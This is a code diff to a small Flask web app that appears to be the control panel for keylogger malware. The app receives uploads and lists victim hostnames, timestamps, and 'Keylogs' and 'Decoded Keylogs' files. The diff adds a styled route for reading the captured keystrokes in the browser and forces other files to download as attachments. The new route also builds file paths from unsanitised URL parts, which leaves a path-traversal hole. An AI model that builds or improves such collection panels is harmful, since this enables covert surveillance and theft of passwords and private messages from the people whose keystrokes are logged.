@@ -1,5 +1,5 @@
 import os
-from flask import Flask, request, send_from_directory, render_template_string
+from flask import Flask, request, send_from_directory, render_template_string, abort
 from werkzeug.utils import secure_filename
 from datetime import datetime
 import pytz
@@ -51,11 +51,11 @@ HTML_TEMPLATE = '''
         <tr>
           <td>{{ folder.hostname }}</td>
           <td>{{ folder.timestamp }}</td>
-          {% for i, file in enumerate(folder.files) %}
+          {% for idx, file in enumerate(folder.files) %}
             <td>
               {% if file %}
-                {% if i == 3 or i == 4 %}  {# Index 3 = Keylogs, Index 4 = Decoded Keylogs #}
-                  <a href="{{ file }}" target="_blank">📄 View</a>
+                {% if idx in [3, 4] %} {# Keylogs / Decoded Keylogs #}
+                  <a href="{{ file.replace('/download/', '/view/') }}" target="_blank">📄 View</a>
                 {% else %}
                   <a href="{{ file }}">📥 View/Download</a>
                 {% endif %}
@@ -142,7 +142,16 @@ def receive():
 
 @app.route("/download/<folder>/<filename>")
 def download(folder, filename):
-    return send_from_directory(os.path.join(UPLOAD_ROOT, folder), filename)
+    return send_from_directory(os.path.join(UPLOAD_ROOT, folder), filename, as_attachment=True)
+
+@app.route("/view/<folder>/<filename>")
+def view_text(folder, filename):
+    try:
+        with open(os.path.join(UPLOAD_ROOT, folder, filename), "r", encoding="utf-8") as f:
+            content = f.read().replace("\n", "<br>").replace(" ", "&nbsp;")
+        return f"<body style='background:black;color:lime;font-family:monospace;padding:10px;'>{content}</body>"
+    except:
+        abort(404)
 
 if __name__ == "__main__":
     app.run(debug=True)
